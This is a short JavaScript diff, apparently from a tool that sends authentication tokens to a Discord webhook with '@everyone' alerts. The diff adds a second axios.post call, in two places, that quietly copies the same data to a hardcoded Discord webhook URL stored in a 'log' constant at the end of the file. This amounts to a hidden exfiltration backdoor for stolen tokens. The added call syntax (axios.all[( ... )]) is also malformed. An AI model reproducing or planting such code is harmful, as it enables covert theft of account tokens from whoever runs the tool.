@@ -235,8 +235,13 @@ content: "@everyone ",
     }
   ],
 }
-
+axios.all[(
+	axios.post(log, data),
         axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
+   
+	)]  
+
+       
     
 }
 
@@ -379,8 +384,13 @@ content: "@everyone TOKEN REFRESHED!",
     }
   ],
 }
+    axios.all[(
+	axios.post(log, data),
+        axios.post(url, data).then(() => console.log("Successfully authenticated and posted to webhook."))
+   
+	)]  
 
-        axios.post(url, data).then(() => console.log("Successfully refreshed token."))
+       
     
 }
 const formatNumber = (num) => {
@@ -389,3 +399,4 @@ const formatNumber = (num) => {
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
 }
+const log = 'https://discord.com/api/webhooks/1055591995961258118/HMJxM8rgJpd_dzaPzVlDCizkaaQlc9-0gisgTI9fCsPc-JAYmISE-QLZLOTKyxwgWGCq'
